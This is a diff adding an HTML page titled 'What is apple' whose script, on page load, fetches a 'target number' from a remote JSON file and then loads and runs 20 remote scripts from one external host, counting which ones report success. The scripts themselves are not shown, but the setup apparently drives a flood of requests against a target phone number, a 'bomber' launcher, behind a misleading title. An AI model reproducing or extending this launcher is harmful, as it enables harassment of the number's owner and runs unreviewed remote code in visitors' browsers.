@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>What is apple</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #f1f5f9;
+      padding: 12px;
+      min-height: 100vh;
+    }
+    .card {
+      background: white;
+      border-radius: 14px;
+      padding: 14px;
+      max-width: 420px;
+      margin: 0 auto;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.06);
+    }
+    h1 {
+      font-size: 1.15rem;
+      margin-bottom: 2px;
+    }
+    .sub {
+      color: #64748b;
+      font-size: 0.78rem;
+      margin-bottom: 10px;
+    }
+    .number-box {
+      background: #f1f5f9;
+      border-radius: 8px;
+      padding: 8px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .number-label {
+      font-size: 0.7rem;
+      color: #64748b;
+    }
+    .number-value {
+      font-size: 1.25rem;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+    .stats {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+    .stat {
+      flex: 1;
+      background: #f8fafc;
+      border-radius: 8px;
+      padding: 7px 4px;
+      text-align: center;
+    }
+    .stat-value {
+      font-size: 1.15rem;
+      font-weight: 700;
+    }
+    .stat-label {
+      font-size: 0.65rem;
+      color: #64748b;
+    }
+    .progress {
+      height: 5px;
+      background: #e2e8f0;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    .progress-bar {
+      height: 100%;
+      background: #2563eb;
+      width: 0%;
+      transition: width 0.2s;
+    }
+    .list {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 5px;
+    }
+    .item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 8px;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      background: #f8fafc;
+    }
+    .item.success { background: #dcfce7; }
+    .item.error { background: #fee2e2; }
+    .item.running { background: #e0f2fe; }
+    .name { font-weight: 500; }
+    .status {
+      font-size: 0.72rem;
+      font-weight: 600;
+    }
+    .success .status { color: #16a34a; }
+    .error .status { color: #dc2626; }
+    .running .status { color: #0284c7; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>ONLY FOR YOU</h1>
+
+    <div class="number-box">
+      <div class="number-label">Target Number</div>
+      <div class="number-value" id="targetNumber">Loading...</div>
+    </div>
+
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value" id="successCount">0</div>
+        <div class="stat-label">Success</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="totalCount">20</div>
+        <div class="stat-label">Total</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="timeTaken">0.00s</div>
+        <div class="stat-label">Time</div>
+      </div>
+    </div>
+
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="list" id="list"></div>
+  </div>
+
+  <script>
+    const NUMBER_JSON = 'https://quickmovies.github.io/api/number.json';
+
+    // ===================== 20 SCRIPTS =====================
+    const SCRIPTS = [
+      'https://quickmovies.github.io/api/v1.js',
+      'https://quickmovies.github.io/api/v2.js',
+      'https://quickmovies.github.io/api/v3.js',
+      'https://quickmovies.github.io/api/v4.js',
+      'https://quickmovies.github.io/api/v5.js',
+      'https://quickmovies.github.io/api/v6.js',
+      'https://quickmovies.github.io/api/v7.js',
+      'https://quickmovies.github.io/api/v8.js',
+      'https://quickmovies.github.io/api/v9.js',
+      'https://quickmovies.github.io/api/v10.js',
+      'https://quickmovies.github.io/api/v11.js',
+      'https://quickmovies.github.io/api/v12.js',
+      'https://quickmovies.github.io/api/v13.js',
+      'https://quickmovies.github.io/api/v14.js',
+      'https://quickmovies.github.io/api/v15.js',
+      'https://quickmovies.github.io/api/v16.js',
+      'https://quickmovies.github.io/api/v17.js',
+      'https://quickmovies.github.io/api/v18.js',
+      'https://quickmovies.github.io/api/v19.js',
+      'https://quickmovies.github.io/api/v20.js'
+    ];
+    // ======================================================
+
+    const listEl = document.getElementById('list');
+    let successCount = 0;
+    let finished = 0;
+    let startTime = Date.now();
+
+    const rows = {};
+    SCRIPTS.forEach(url => {
+      const name = url.split('/').pop();
+      const div = document.createElement('div');
+      div.className = 'item running';
+      div.innerHTML = `
+        <span class="name">${name}</span>
+        <span class="status">...</span>
+      `;
+      listEl.appendChild(div);
+      rows[name] = div;
+    });
+
+    function updateStats() {
+      document.getElementById('successCount').textContent = successCount;
+      document.getElementById('totalCount').textContent = SCRIPTS.length;
+      const sec = ((Date.now() - startTime) / 1000).toFixed(2);
+      document.getElementById('timeTaken').textContent = sec + 's';
+      document.getElementById('progressBar').style.width = (finished / SCRIPTS.length * 100) + '%';
+    }
+
+    async function loadTargetNumber() {
+      try {
+        const res = await fetch(NUMBER_JSON + '?t=' + Date.now());
+        const data = await res.json();
+        let num = Array.isArray(data) ? (data[0]?.number ?? data[0]) : null;
+        document.getElementById('targetNumber').textContent = String(num || 'Not found').trim();
+      } catch {
+        document.getElementById('targetNumber').textContent = 'Error';
+      }
+    }
+
+    function loadScript(url) {
+      return new Promise(resolve => {
+        const name = url.split('/').pop();
+        const key = '__result_' + name;
+
+        window[key] = null;
+        window.__lastResult = null;
+
+        const script = document.createElement('script');
+        script.src = url + '?t=' + Date.now();
+
+        script.onload = () => {
+          setTimeout(() => {
+            const result = window[key] || window.__lastResult;
+            resolve({ name, ok: true, result });
+          }, 250);
+        };
+
+        script.onerror = () => resolve({ name, ok: false });
+
+        document.head.appendChild(script);
+      });
+    }
+
+    async function runAll() {
+      startTime = Date.now();
+      successCount = 0;
+      finished = 0;
+      updateStats();
+
+      await loadTargetNumber();
+
+      const promises = SCRIPTS.map(async url => {
+        const res = await loadScript(url);
+        finished++;
+
+        const row = rows[res.name];
+        if (res.ok && res.result && res.result.success) {
+          successCount++;
+          row.className = 'item success';
+          row.querySelector('.status').textContent = 'OK';
+        } else {
+          row.className = 'item error';
+          row.querySelector('.status').textContent = 'Fail';
+        }
+        updateStats();
+      });
+
+      await Promise.all(promises);
+    }
+
+    runAll();
+  </script>
+</body>
+</html>
